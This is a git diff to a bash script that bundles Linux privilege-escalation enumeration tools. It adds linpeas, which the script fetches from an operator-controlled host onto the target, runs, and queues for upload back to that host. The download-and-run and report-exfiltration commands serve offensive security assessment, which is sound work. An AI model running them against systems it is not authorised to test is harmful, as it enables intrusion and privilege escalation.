@@ -46,6 +46,7 @@ function usage () {
 		echo -e "${GREEN}         -w - Start builtin web server for downloading files and uploading reports.";
 		echo -e "${GREEN}         -u - Update to the latest versions of each tool, overwriting any existing versions.";
 		echo -e "${GREEN}         -r - Upload reports back to the host machine web server (must support PUT requests).";
+#  		echo -e "${GREEN}         -a - Specify architecture of enumeration target.";	# Placeholder Funtion to be added to allow Windows enumeration
 }
 
 # Arguments
@@ -110,6 +111,7 @@ function update () {
 		wget -nv "https://raw.githubusercontent.com/belane/linux-soft-exploit-suggester/master/linux-soft-exploit-suggester.py" -O les-soft.py;
 		wget -nv "https://gitlab.com/exploit-database/exploitdb/-/raw/main/files_exploits.csv" -O files_exploits.csv;
 		wget -nv "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O les.sh;
+  		wget -nv "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh;
 		echo -e "${GREEN}[i] Update complete!${NC}";
 		exit 0;
 }
@@ -178,6 +180,8 @@ function download () {
 				chmod +x "$DIR"/uptux.py;
 				wget -nv -t 2 "http://$IP:$PORT/suid3num.py" -O "$DIR"/suid3num.py;
 				chmod +x "$DIR"/suid3num.py;
+				wget -nv -t 2 "http://$IP:$PORT/linpeas.sh" -O "$DIR"/linpeas.sh;
+				chmod +x "$DIR"/linpeas.sh;
 
 				# exploit suggestion tools
 				wget -nv -t 2 "http://$IP:$PORT/les.sh" -O "$DIR"/les.sh;
@@ -201,7 +205,10 @@ function runtools () {
 				start "LinEnum";
 				"$DIR"/linenum.sh -r report -e "$DIR"/linenum-report -t;
 				complete "LinEnum";
-				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
+				start "LinPeas";
+				"$DIR"/linpeas.sh -a -q > "$DIR"/linpeas.txt -t;
+				complete "LinPeas";
+    				if [[ "$PY2" == "" && "$PY3" == "" ]]; then
 						echo -e "${ORANGE}[!] No version of Python found, skipping linuxprivchecker!${NC}";
 				elif [[ "$PY2" == "" ]]; then
 						echo -e "${ORANGE}[!] Python 2 was not found, skipping linuxprivchecker!${NC}";
@@ -291,7 +298,7 @@ function runtools () {
 # Upload reports
 function upload () {
 
-	REPORTS=( "lse-report.txt" "linenum-report.tar.gz" "linuxprivchecker-report.txt" "uptux-report.txt" "suid3num-report.txt" "les-report.txt" "les-soft-report.txt" )
+	REPORTS=( "lse-report.txt" "linenum-report.tar.gz" "linuxprivchecker-report.txt" "uptux-report.txt" "suid3num-report.txt" "les-report.txt" "les-soft-report.txt" "linpeas.txt" )
 
 	CURL=$(command -v curl);
 	if [[ "$CURL" == ""  ]]; then
